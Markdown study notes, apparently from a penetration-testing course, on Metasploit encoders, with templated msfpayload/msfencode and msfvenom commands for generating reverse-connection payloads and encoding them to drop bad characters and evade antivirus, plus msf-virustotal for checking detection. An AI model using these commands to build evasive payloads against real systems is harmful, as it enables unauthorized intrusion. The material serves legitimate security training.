- Encoders  makes payloads compatible within different processor.
- It also help with antivirus evasion.
- Encoders is used for changing the payload to run on different Operating System and Architecture.
	- These architecture include:
		- `x64`
		- `x86`
		- `sparc`
		- `ppc`
		- `mips`
	- They are also needed to remove hexadecimal opcodes known as `bad characters` from the payload.
- Encoding the payload in different formats could help with the `AV` detection.

## Selecting an Encoder:

- There are several different sub-modules that took care of payloads and encoders.
- They were kept separately from msfconsole script and were called ==`msfpayload`== and ==`msfencode`==.
- These two tools are located in ==`/usr/share/framework2`==
- To create a custom payload, go through ==`msfpayload`== and then encode it according t the target OS architecture using ==`msfencode`== 
	- `msfpayload <payload> LHOST=<local_add> LPORT=<Local_listening_port> R | msfencode -b '\x00' -f perl -e <encode>`

- ## Generating Payload -without Encoding
	- The scripts have combined within msfvenom tool.
	- The Generation and Encoding of payload is taken care at once by msfvenom after the update(2015).
		- `msfvenom -a x86 --platform windows -p <payload> LHOST=<local_add> LPORT=<local_port> -b "\x00" -f perl.`

	- To list the encoders that are present for the payload use ==`show encodes`==
		- this command will filter out the available encodes for the specific payloads.
	
	- ## MSFvenom encodes the payload in a file.
		
		- `msfvenom -a x86 --platform windows -p <payload> LHOST=<local_add> LPORT=<local_port> -e <preferred_encoder> -f <file_type> -o <./output_filename>`
	
	- ## MSF - VirusTotal:
		- Metasploit offers a tool called ==`msf-virustotal`== that can use an API key to analyze the payload.
			- `msf-virustotal -k <API key> -f <filename>`
		- This tool can help  a user to analyze the payload and prepare the payload for evasion.
[[Introduction to Metasploit]]